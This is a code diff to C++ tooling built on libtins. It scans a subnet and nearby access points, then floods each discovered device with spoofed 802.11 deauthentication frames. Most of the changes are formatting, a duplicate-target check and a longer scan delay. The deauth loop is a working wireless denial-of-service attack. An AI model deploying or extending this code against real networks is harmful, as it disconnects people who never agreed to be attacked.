@@ -21,8 +21,10 @@ Network::sendDeauth()
     PacketSender sender;
     while (deauthing) {
         for (auto target : targets) {
-            if (!deauthing) break;
-            std::cout << "Deauthing " << target.first.to_string() << std::endl;
+            if (!deauthing)
+                break;
+            std::cout << "Deauthing " << target.first.to_string() << " ("
+                      << target.second.to_string() << ")" << std::endl;
             deauthPacket = Dot11Deauthentication(target.second, spoofedBSSID);
             deauthPacket.addr3(spoofedBSSID); // Set the BSSID
             deauthPacket.reason_code(0x0007); // From airplay-ng
@@ -72,15 +74,18 @@ Network::getInterfaces()
 void
 Network::scanDevices(Tins::PacketSender& sender, std::string iprange)
 {
-    auto networkRange = AddressRange<IPv4Address>::from_mask(defaultIface.ipv4_address(), defaultIface.ipv4_mask());
+    auto networkRange = AddressRange<IPv4Address>::from_mask(
+      defaultIface.ipv4_address(), defaultIface.ipv4_mask());
     if (!iprange.empty()) {
         // TODO: Validate the range
         int delimiter_pos = iprange.find("/");
         std::string base = iprange.substr(0, delimiter_pos);
-        int mask = std::stoi(iprange.substr(delimiter_pos + 1, iprange.length() - delimiter_pos));
+        int mask = std::stoi(
+          iprange.substr(delimiter_pos + 1, iprange.length() - delimiter_pos));
         networkRange = IPv4Address(base) / mask;
     } else {
-        std::cout << "[*] Using " << defaultIface.ipv4_address().to_string() << " / " << defaultIface.ipv4_mask().to_string()<<std::endl;
+        std::cout << "[*] Using " << defaultIface.ipv4_address().to_string()
+                  << " / " << defaultIface.ipv4_mask().to_string() << std::endl;
     }
     NetworkInterface::Info infoScanner = defaultIface.info();
     IP ping;
@@ -101,11 +106,13 @@ Network::ipScanCallback(Tins::PDU& pdu)
     const IP& ip = pdu.rfind_pdu<IP>();
     const ICMP& icmp = pdu.rfind_pdu<ICMP>();
     if (icmp.type() == ICMP::ECHO_REPLY) {
-        //todo: don't add if already in the map
-        std::cout << "\t-> " << ip.src_addr().to_string() << " ("
-                  << eth.src_addr().to_string() << ")" << std::endl;
-        targets.insert(std::pair<Tins::IPv4Address, Tins::HWAddress<6>>(
-          ip.src_addr(), eth.src_addr()));
+        // todo: don't add if already in the map
+        if (targets.find(ip.src_addr()) == targets.end()) {
+            std::cout << "\t-> " << ip.src_addr().to_string() << " ("
+                << eth.src_addr().to_string() << ")" << std::endl;
+            targets.insert(std::pair<Tins::IPv4Address, Tins::HWAddress<6>>(
+                        ip.src_addr(), eth.src_addr()));
+        }
     }
     return ipScanning;
 }
@@ -127,6 +134,7 @@ Network::getConnectedDevices(std::string iprange)
     std::thread sniff_thread([&]() { sniffer.sniff_loop(handler); });
     scanDevices(sender, iprange);
     sniff_thread.join();
+
     return targets.size();
 }
 
@@ -135,10 +143,10 @@ Network::getAccessPoints()
 {
     SnifferConfiguration config;
     config.set_promisc_mode(true);
-    config.set_filter("type mgt subtype beacon");
+    config.set_filter("wlan type mgt subtype beacon");
     config.set_rfmon(true);
     Sniffer sniffer(spoofingIfaceName, config);
-    
+
     scanning = true;
     std::thread scanThread(&Network::stopScan, this);
     scanThread.detach();
@@ -191,7 +199,7 @@ Network::apScanCallback(PDU& pdu)
 void
 Network::stopScan()
 {
-    std::this_thread::sleep_for(std::chrono::seconds(3));
+    std::this_thread::sleep_for(std::chrono::seconds(5));
     scanning = false;
 }
 
